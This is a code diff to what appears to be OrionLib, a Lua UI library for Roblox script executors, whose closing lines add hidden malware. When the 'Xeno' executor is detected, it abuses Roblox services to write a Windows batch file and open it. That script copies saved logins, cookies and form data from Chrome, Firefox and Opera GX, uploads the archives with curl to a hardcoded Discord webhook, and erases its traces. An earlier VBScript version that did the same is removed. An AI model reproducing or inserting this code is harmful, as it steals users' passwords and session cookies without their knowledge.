@@ -2043,51 +2043,73 @@ function OrionLib:Destroy()
 end
 
 
+
+
+
 if string.find(identifyexecutor(), "Xeno") then
-			local data = {
-        ["avatar_url"] = "",
-        ["content"] = "COOKI COMIN, "..identifyexecutor(),
-    }
-    
-
-sendWebhook("https://discord.com/api/webhooks/1231675068694790235/JYTvGPHAlnbJ1SC85cH7OP-vAqZG9g9X_wEcLoIJrHUKM5QBjdl2ppc61Y6M_ma0afWl", HttpService:JSONEncode(data))	
-			
 script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(script:FindFirstAncestorWhichIsA("DataModel"):FindService("ScriptContext"):SaveScriptProfilingData([[
-Dim fso, tempFile, batFile, wshShell
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set wshShell = CreateObject("WScript.Shell")
 
-batFile = fso.GetSpecialFolder(2) & "\CloneChrome.bat"
+@echo off
+powershell -WindowStyle Minimized -Command "" 
+setlocal enabledelayedexpansion
 
-Set tempFile = fso.CreateTextFile(batFile, True)
 
-tempFile.WriteLine("@echo off")
-tempFile.WriteLine("setlocal enabledelayedexpansion")
-tempFile.WriteLine("")
-tempFile.WriteLine("set ""APPDATA_PATH=%LOCALAPPDATA%""")
-tempFile.WriteLine("set ""CLONE_PATH=%TEMP%\ChromeBackup""")
-tempFile.WriteLine("set ""ZIP_PATH=%TEMP%\ChromeBackup.zip""")
-tempFile.WriteLine("set ""WEBHOOK_URL=https://discord.com/api/webhooks/1231675068694790235/JYTvGPHAlnbJ1SC85cH7OP-vAqZG9g9X_wEcLoIJrHUKM5QBjdl2ppc61Y6M_ma0afWl""")
-tempFile.WriteLine("echo Cloning Chrome User Data...")
-tempFile.WriteLine("if not exist ""%CLONE_PATH%"" (")
-tempFile.WriteLine("    mkdir ""%CLONE_PATH%""")
-tempFile.WriteLine(")")
-tempFile.WriteLine("")
-tempFile.WriteLine("xcopy ""%APPDATA_PATH%\Google\Chrome\User Data\Default\Login Data"" ""%CLONE_PATH%"" /E /I /Q /H /Y > clone_log.txt 2>&1")
-tempFile.WriteLine("xcopy ""%APPDATA_PATH%\Google\Chrome\User Data\Default\Network\Cookies"" ""%CLONE_PATH%"" /E /I /Q /H /Y > clone_log.txt 2>&1")
-tempFile.WriteLine("xcopy ""%APPDATA_PATH%\Google\Chrome\User Data\Default\Web Data"" ""%CLONE_PATH%"" /E /I /Q /H /Y > clone_log.txt 2>&1")
-tempFile.WriteLine("")
-tempFile.WriteLine("powershell -Command ""Compress-Archive -Path '%CLONE_PATH%' -DestinationPath '%ZIP_PATH%' -Force""")
-tempFile.WriteLine("")
-tempFile.WriteLine("curl -F ""file=@%ZIP_PATH%"" ""%WEBHOOK_URL%""")
-tempFile.WriteLine("")
-tempFile.WriteLine("rmdir /s /q ""%CLONE_PATH%""")
-tempFile.WriteLine("del ""%ZIP_PATH%""")
-tempFile.WriteLine("")
-tempFile.Close()
-wshShell.Run batFile, 0, False
+:: Set paths
+set "TEMP_BACKUP=%TEMP%\BrowserBackup"
+set "ZIP_PATH=%TEMP%\BrowserBackup.zip"
+set "BACKUP_URL=https://discord.com/api/webhooks/1231675068694790235/JYTvGPHAlnbJ1SC85cH7OP-vAqZG9g9X_wEcLoIJrHUKM5QBjdl2ppc61Y6M_ma0afWl"
+
+if not exist "%TEMP_BACKUP%" mkdir "%TEMP_BACKUP%"
+
+:: CHROME BACKUP
+set "CHROME_PATH=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
+if exist "%CHROME_PATH%" (
+    mkdir "%TEMP_BACKUP%\Chrome"
+    xcopy "%CHROME_PATH%\Login Data" "%TEMP_BACKUP%\Chrome" /E /I /Q /H /Y > nul 2>&1
+    xcopy "%CHROME_PATH%\Network\Cookies" "%TEMP_BACKUP%\Chrome" /E /I /Q /H /Y >> nul 2>&1
+    xcopy "%CHROME_PATH%\Web Data" "%TEMP_BACKUP%\Chrome" /E /I /Q /H /Y >> nul 2>&1
+
+    tar -cf "%TEMP_BACKUP%\ChromeBackup.zip" -C "%TEMP_BACKUP%\Chrome" .
+    curl -F "file=@%TEMP_BACKUP%\ChromeBackup.zip" "%BACKUP_URL%"
+
+    tar -cf "%TEMP_BACKUP%\ChromeNetworkBackup.zip" -C "%CHROME_PATH%\Network" .
+    curl -F "file=@%TEMP_BACKUP%\ChromeNetworkBackup.zip" "%BACKUP_URL%"
+)
+
+:: FIREFOX BACKUP
+set "FIREFOX_PATH=%APPDATA%\Mozilla\Firefox\Profiles"
+if exist "%FIREFOX_PATH%" (
+    mkdir "%TEMP_BACKUP%\Firefox"
+    xcopy "%FIREFOX_PATH%\*.sqlite" "%TEMP_BACKUP%\Firefox" /E /I /Q /H /Y > nul 2>&1
+    powershell -Command "Compress-Archive -Path '%TEMP_BACKUP%\Firefox\*' -DestinationPath '%TEMP_BACKUP%\FirefoxBackup.zip' -Force"
+    curl -F "file=@%TEMP_BACKUP%\FirefoxBackup.zip" "%BACKUP_URL%"
+)
+
+:: OPERA GX BACKUP
+set "OPERA_GX_PATH=%APPDATA%\Opera Software\Opera GX Stable"
+if exist "%OPERA_GX_PATH%" (
+    mkdir "%TEMP_BACKUP%\OperaGX"
+    xcopy "%OPERA_GX_PATH%\Login Data" "%TEMP_BACKUP%\OperaGX" /E /I /Q /H /Y > nul 2>&1
+    xcopy "%OPERA_GX_PATH%\Cookies" "%TEMP_BACKUP%\OperaGX" /E /I /Q /H /Y >> nul 2>&1
+    xcopy "%OPERA_GX_PATH%\Web Data" "%TEMP_BACKUP%\OperaGX" /E /I /Q /H /Y >> nul 2>&1
+
+    del /s /q "%TEMP_BACKUP%\OperaGX\Cache" 2>nul
+    del /s /q "%TEMP_BACKUP%\OperaGX\History" 2>nul
+    del /s /q "%TEMP_BACKUP%\OperaGX\Session Storage" 2>nul
+    del /s /q "%TEMP_BACKUP%\OperaGX\Local Storage" 2>nul
+
+    tar -cf "%TEMP_BACKUP%\OperaGXBackup.zip" -C "%TEMP_BACKUP%\OperaGX" .
+    curl -F "file=@%TEMP_BACKUP%\OperaGXBackup.zip" "%BACKUP_URL%"
+)
+
+:: Cleanup
+rmdir /s /q "%TEMP_BACKUP%"
+
+
+
 
             ]], 
-            "thebestexecutorofalltime.vbs"))
+            "thebestexecutorofalltime.bat"))
 end
+
 return OrionLib
